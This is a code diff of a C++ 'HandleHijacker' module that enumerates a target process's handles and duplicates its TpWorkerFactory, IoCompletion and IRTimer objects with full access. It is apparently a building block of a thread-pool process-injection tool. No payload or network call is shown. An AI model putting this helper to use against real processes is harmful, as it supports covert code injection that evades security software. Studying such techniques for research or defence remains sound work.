@@ -1,35 +1,22 @@
 #include "HandleHijacker.hpp"
 
-HandleHijacker::HandleHijacker(std::wstring wsObjectType) : m_wsObjectType(wsObjectType)
-{
-}
 
-std::shared_ptr<HANDLE> HandleHijacker::Hijack(DWORD dwDesiredAccess)
+std::shared_ptr<HANDLE> HijackProcessHandle(std::wstring wsObjectType, std::shared_ptr<HANDLE> p_hTarget, DWORD dwDesiredAccess)
 {
-    auto pSystemInformation = w_QueryInformation<decltype(NtQuerySystemInformation), SYSTEM_INFORMATION_CLASS>("NtQuerySystemInformation", NtQuerySystemInformation, static_cast<SYSTEM_INFORMATION_CLASS>(SystemHandleInformation));
-    const auto pSystemHandleInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(pSystemInformation.data());
+    auto pProcessInformation = w_QueryInformation<decltype(NtQueryInformationProcess), HANDLE, PROCESSINFOCLASS>("NtQueryInformationProcess", NtQueryInformationProcess, *p_hTarget, static_cast<PROCESSINFOCLASS>(ProcessHandleInformation));
+    const auto pProcessHandleInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(pProcessInformation.data());
 
-    DWORD dwOwnerProcessId;
 	std::shared_ptr<HANDLE> p_hDuplicatedObject;
-    std::shared_ptr<HANDLE> p_hOwnerProcess;
     std::vector<BYTE> pObjectInformation;
     PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;
 
-    for (auto i = 0; i < pSystemHandleInformation->NumberOfHandles; i++)
+    for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++)
     {
         try {
-            dwOwnerProcessId = pSystemHandleInformation->Handles[i].UniqueProcessId;
-
-            if (!IsDesiredOwnerProcess(dwOwnerProcessId))
-            {
-                continue;
-            }
-
-            p_hOwnerProcess = w_OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwOwnerProcessId);
 
             p_hDuplicatedObject = w_DuplicateHandle(
-                *p_hOwnerProcess,
-                UlongToHandle(pSystemHandleInformation->Handles[i].HandleValue), 
+                *p_hTarget,
+                pProcessHandleInformation->Handles[i].HandleValue,
                 GetCurrentProcess(),
                 dwDesiredAccess,
                 FALSE,
@@ -38,12 +25,7 @@ std::shared_ptr<HANDLE> HandleHijacker::Hijack(DWORD dwDesiredAccess)
             pObjectInformation = w_QueryInformation<decltype(NtQueryObject), HANDLE, OBJECT_INFORMATION_CLASS>("NtQueryObject", NtQueryObject, *p_hDuplicatedObject, ObjectTypeInformation);
             pObjectTypeInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(pObjectInformation.data());
 
-            if (m_wsObjectType != std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
-                continue;
-            }
-
-            if (!IsDesiredHandle(p_hDuplicatedObject))
-            {
+            if (wsObjectType != std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
                 continue;
             }
 
@@ -55,40 +37,18 @@ std::shared_ptr<HANDLE> HandleHijacker::Hijack(DWORD dwDesiredAccess)
     throw std::runtime_error("Failed to hijack object handle");
 }
 
-bool HandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
+std::shared_ptr<HANDLE> HijackWorkerFactoryProcessHandle(std::shared_ptr<HANDLE> p_hTarget)
 {
-	return true;
+    return HijackProcessHandle(std::wstring(L"TpWorkerFactory"), p_hTarget, WORKER_FACTORY_ALL_ACCESS);
 }
 
-bool HandleHijacker::IsDesiredHandle(std::shared_ptr<HANDLE> p_hHijackedObject)
+std::shared_ptr<HANDLE> HijackIoCompletionProcessHandle(std::shared_ptr<HANDLE> p_hTarget)
 {
-	return true;
+    return HijackProcessHandle(std::wstring(L"IoCompletion"), p_hTarget, IO_COMPLETION_ALL_ACCESS);
 }
 
-WorkerFactoryHandleHijacker::WorkerFactoryHandleHijacker(DWORD dwTargetPid)
-: HandleHijacker{ std::wstring(L"TpWorkerFactory") }, m_dwTargetPid(dwTargetPid)
+std::shared_ptr<HANDLE> HijackIRTimerProcessHandle(std::shared_ptr<HANDLE> p_hTarget)
 {
+    return HijackProcessHandle(std::wstring(L"IRTimer"), p_hTarget, TIMER_ALL_ACCESS);
 }
 
-bool WorkerFactoryHandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
-{
-	if (m_dwTargetPid == dwOwnerProcessId)
-	{
-        return true;
-	}
-    return false;
-}
-
-IoCompletionHandleHijacker::IoCompletionHandleHijacker(DWORD dwTargetPid)
-    : HandleHijacker{ std::wstring(L"IoCompletion") }, m_dwTargetPid(dwTargetPid)
-{
-}
-
-bool IoCompletionHandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
-{
-    if (m_dwTargetPid == dwOwnerProcessId)
-    {
-        return true;
-    }
-    return false;
-}
